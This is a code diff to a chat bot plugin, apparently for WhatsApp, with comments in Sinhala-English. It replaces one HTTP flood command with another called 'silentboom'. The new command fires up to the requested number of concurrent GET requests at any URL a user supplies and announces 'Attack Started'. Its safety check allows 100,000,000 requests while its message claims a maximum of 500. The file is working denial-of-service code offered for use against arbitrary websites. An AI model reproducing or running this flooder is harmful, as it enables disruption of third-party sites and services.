@@ -30,59 +30,45 @@ const fkontak = {
 
 
 
+
 cmd({
-    pattern: "req",
-    react: "💥",
-    alias: ["requestboom", "flood"],
-    desc: "Execute high-volume request bursts without message editing.",
+    pattern: "silentboom",
+    react: "🌑",
+    alias: ["sboom", "ghost"],
+    desc: "Silent ultra-fast request burst with a single end-report.",
     category: "owner",
-    use: ".boom <url> <amount>",
+    use: ".silentboom <url> <amount>",
     filename: __filename
 }, async (conn, mek, m, { reply, args }) => {
     try {
-        const targetUrl = args[0];
-        const requestAmount = parseInt(args[1]);
+        const url = args[0];
+        const count = parseInt(args[1]);
 
-        if (!targetUrl || isNaN(requestAmount)) {
-            return reply("*⚠️ BOOM Error:* URL and Count required.\nExample: `.boom https://site.com 1000` ");
+        if (!url || !count) return reply("⚠️ Usage: .silentboom <url> <amount>");
+        if (count > 100000000) return reply("❌ Limit exceeded for safety (Max: 500).");
+
+        await reply(`🚀 *Attack Started:* Sending ${count} requests to ${url}...`);
+
+        // Request tika store karana array ekak
+        const requests = [];
+
+        for (let i = 0; i < count; i++) {
+            // Axios request eka promise ekak widiyata array ekata danna
+            // .catch use karanne ekak fail unath anith tika stop wenne nathi wenna
+            requests.push(axios.get(url).catch(() => null));
         }
 
-        // Informing the start
-        await reply(`*💥 REQUEST BOOM STARTED 💥*\n\n*Target:* ${targetUrl}\n*Total:* ${requestAmount}\n\n_Progress updates will be sent every 500 requests._`);
+        // Okkoma requests iwara wenakan wait karanawa
+        await Promise.all(requests);
 
-        let successCount = 0;
-        let errorCount = 0;
+        // Okkoma iwara unama success message eka
+        return reply(`✅ *Boom Success!* \n\n🎯 Target: ${url}\n📊 Total Requests: ${count}\n⚡ Status: Completed without crashing.`);
 
-        for (let i = 1; i <= requestAmount; i++) {
-            
-            // Fast Asynchronous requests
-            axios.get(targetUrl, { timeout: 3000 })
-                .then(() => { successCount++; })
-                .catch(() => { errorCount++; });
-
-            // Send a NEW message every 500 requests to track progress
-            if (i % 500 === 0) {
-                // Small delay to prevent message flooding
-                await new Promise(resolve => setTimeout(resolve, 1000));
-                
-                await conn.sendMessage(m.chat, { 
-                    text: `*📊 Boom Progress:* ${i} / ${requestAmount}\n✅ Success: ${successCount}\n❌ Failed: ${errorCount}` 
-                });
-            }
-        }
-
-        // Final Report sent as a new message
-        await conn.sendMessage(m.chat, { 
-            text: `*🎯 BOOM COMPLETED 🎯*\n\n*Target:* ${targetUrl}\n*Total Dispatched:* ${requestAmount}\n*Successful Hits:* ${successCount}\n*Failed:* ${errorCount}` 
-        });
-
-    } catch (error) {
-        reply("*❌ Error:* " + error.message);
+    } catch (e) {
+        console.log(e);
+        reply("⚠️ An error occurred. Check the URL format.");
     }
 });
-
-
-
 
 cmd({
     pattern: "packages",
